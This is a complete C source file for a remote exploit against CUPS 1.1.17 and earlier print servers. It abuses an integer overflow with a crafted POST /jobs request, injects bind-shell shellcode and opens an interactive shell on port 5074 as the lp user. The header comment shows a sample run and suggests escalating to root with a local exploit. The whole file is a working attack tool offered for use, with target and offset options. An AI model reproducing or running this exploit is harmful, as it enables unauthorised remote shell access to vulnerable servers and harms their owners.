/*
 *  by sigdoom [at] bigbox.mine.nu
 *
 *  CUPS remote exploit. Exploits integer overflow and gives you shell with
 *  daemons priviledges (usualy lp), after that you can try to use local
 *  CUPS exploit to get root.
 *
 *  1.1.17 and earlier versions are affected. Tested on gentoo with
 *  installed cups-1.1.17_pre20021025:
 *
 *  $ gcc -o sigcups sigcups.c && ./sigcups -t 127.0.0.1
 *  [*] connecting to 127.0.0.1 port 631
 *  [*] trying retaddr = 0x2fffbed8; *4 = 0xbffefb60
 *  [*] connected, sending exploit...
 *  [*] done... let's see if we have a shell...
 *  [*] w000t, here's a shell kiddie...
 *  uid=4(lp) gid=7(lp) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
 *  Linux fox.chroot.lt 2.4.20 #2 Sun Dec 29 18:30:35 EET 2002 i686 Pentium III (Coppermine) GenuineIntel GNU/Linux
 *
 */
 
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <getopt.h>

#define BUF_SIZE	4096

#define die(a) { perror("[!] "a); exit(-1); }

int		verbose = 0;
char		*host = "127.0.0.1";
int		port = 631;
unsigned long	retaddr = 805289688; /* exploit: *($retaddr * 4) = $address_of_shellcode */

char greet[] = "POST /jobs HTTP/1.1\nContent-type: application/x-www-form-urlencoded\nContent-length: %d\n\n";
char evilmsg[] = "-%u=";

/*
 * Bind shell hack by s0t4ipv6@shellcode.com.ar
 */
char hellcode[]=
	"\x31\xc0\x89\xc3\xb0\x02\xcd\x80\x38\xc3\x74\x05\x8d\x43\x01\xcd\x80"
	"\x31\xc0\x89\x45\x10\x40\x89\xc3\x89\x45\x0c\x40\x89\x45\x08\x8d\x4d"
	"\x08\xb0\x66\xcd\x80\x89\x45\x08\x43\x66\x89\x5d\x14\x66\xc7\x45\x16"
	"\x13\xd2\x31\xd2\x89\x55\x18\x8d\x55\x14\x89\x55\x0c\xc6\x45\x10\x10"
	"\xb0\x66\xcd\x80\x40\x89\x45\x0c\x43\x43\xb0\x66\xcd\x80\x43\x89\x45"
	"\x0c\x89\x45\x10\xb0\x66\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41"
	"\x80\xf9\x03\x75\xf6\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
	"\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";

void usage(char *p) {
	printf(
		"Remote CUPS exploit for 1.1.17 and earlier versions\n"
		"by sigdoom [at] bigbox.mine.nu\n"
		"Usage: %s [-t <target>, -p <port>, -o <offset>, -r <retaddr>]\n"
		"\t-t <target> - IP of target\n"
		"\t-p <port> - port where cupsd runs\n"
		"\t-o <offset> - offset for retaddr ($retaddr + $offset)\n"
		"\t-r <retaddr> - give exact retaddr\n", p);
	exit(0);
}

int main(int argc, char *argv[]) {
	struct sockaddr_in dest;
	int	i, off, sock;
	fd_set	rset;
	char	buf[BUF_SIZE], buf2[BUF_SIZE];
	char	c;
	
	while ((c = getopt(argc, argv, "ho:p:r:t:v")) > 0 ){
		switch (c) {
		case 't':
			host = (char *)optarg;
			break;
		case 'o':
			retaddr += atol(optarg);
			break;
		case 'r':
			retaddr = atol(optarg);
			break;
		case 'p':
			port = atoi(optarg);
			break;
		case 'v':
			verbose++;
			break;
		case 'h':
			usage(argv[0]);
		case '?':
		case ':':
			exit(-1);
		}
	}

	printf("[*] connecting to %s port %d\n", host, port);
	printf("[*] trying retaddr = 0x%x; *4 = 0x%x\n", retaddr, retaddr*4);

	if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
		die("socket()");
		
	dest.sin_family = AF_INET;
	dest.sin_port = htons(port);
	dest.sin_addr.s_addr = inet_addr(host);
	bzero(&(dest.sin_zero), 8);

	if (connect(sock, (struct sockaddr*)&dest, sizeof(struct sockaddr)) < 0)
		die("connect()");
	

	printf("[*] connected, sending exploit...\n");

	off = sprintf(buf, evilmsg, retaddr);
	for (i = 0; i < sizeof(hellcode)-1; i++)
		sprintf(buf+off+i*3, "%%%02X", (unsigned char)hellcode[i]);

	sprintf(buf2, greet, strlen(buf));
	
	if (verbose) {
		printf("%s", buf2);
		printf("%s\n", buf);
	}

	write(sock, buf2, strlen(buf2));
	write(sock, buf, strlen(buf));

	printf("[*] done... let's see if we have a shell...\n");
	close(sock);

	if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
		die("socket()");

	dest.sin_family = AF_INET;
	dest.sin_port = htons(5074);
	dest.sin_addr.s_addr = inet_addr(host);
	bzero(&(dest.sin_zero), 8);

	system("sleep 2");
	if (connect(sock, (struct sockaddr*)&dest, sizeof(struct sockaddr)) < 0) {
		printf("[-] better luck next time! try different offsets maybe.\n");
		die("connect()");
	}

	printf("[*] w000t, here's a shell kiddie...\n");
	write(sock, "id;uname -a\n", 12);
	while (1) {
		FD_ZERO(&rset);
		FD_SET(sock,&rset);
		FD_SET(STDIN_FILENO,&rset);
		
		select(sock + 1, &rset, NULL, NULL, NULL);
		
		if (FD_ISSET(sock, &rset)) {
			i = read(sock, buf, BUF_SIZE - 1);
			if (i <= 0) {
				printf("[!] Connection closed.\n");
				close(sock);
				exit(0);
			}
			buf[i] = 0;
			printf("%s", buf);
		}
		if (FD_ISSET(STDIN_FILENO, &rset)) {
			i = read(STDIN_FILENO, buf, BUF_SIZE - 1);
			if (i > 0) {
				buf[i]=0;
				write(sock, buf, i);
			}
		}
	}

	return 0;
}

